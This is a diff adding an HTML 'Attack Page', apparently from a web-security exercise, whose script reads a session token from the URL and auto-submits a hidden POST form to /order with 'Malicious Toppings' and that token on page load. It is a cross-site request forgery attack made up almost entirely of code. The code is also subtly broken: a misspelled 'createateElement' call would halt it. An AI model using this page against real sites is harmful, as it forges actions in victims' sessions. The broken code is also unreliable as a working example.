@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack Page</title>
+</head>
+<body>
+    <h1>Attack Page</h1>
+    <p>This is the attack page. Tasks will be executed automatically.</p>
+    <script>
+        // Function to extract session token from URL query parameter
+        function getSessionToken() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('session_token');
+        }
+
+        // Function to submit order form with session token
+        function submitOrder(sessionToken) {
+            if (sessionToken.includes("<script>")) {
+                alert("Script detected. Operation not allowed.");
+                return;
+            }
+
+            const form = document.createElement('form');
+            form.setAttribute('method', 'post');
+            form.setAttribute('action', '/order');
+
+            const crustInput = document.createElement('input');
+            crustInput.setAttribute('type', 'hidden');
+            crustInput.setAttribute('name', 'crust');
+            crustInput.setAttribute('value', 'Stuffed');
+
+            const sizeInput = document.createateElement('input');
+            sizeInput.setAttribute('type', 'hidden');
+            sizeInput.setAttribute('name', 'size');
+            sizeInput.setAttribute('value', 'Large');
+
+            const toppingsInput = document.createElement('input');
+            toppingsInput.setAttribute('type', 'hidden');
+            toppingsInput.setAttribute('name', 'toppings');
+            toppingsInput.setAttribute('value', 'Malicious Toppings');
+
+            const sessionTokenInput = document.createElement('input');
+            sessionTokenInput.setAttribute('type', 'hidden');
+            sessionTokenInput.setAttribute('name', 'session_token');
+            sessionTokenInput.setAttribute('value', sessionToken);
+
+            form.appendChild(crustInput);
+            form.appendChild(sizeInput);
+            form.appendChild(toppingsInput);
+            form.appendChild(sessionTokenInput);
+
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        // Entry point: extract session token and submit order if valid
+        const sessionToken = getSessionToken();
+        if (!sessionToken || sessionToken.includes("<script>")) {
+            alert("Invalid session token. Access denied.");
+        } else {
+            submitOrder(sessionToken);
+        }
+    </script>
+</body>
+</html>
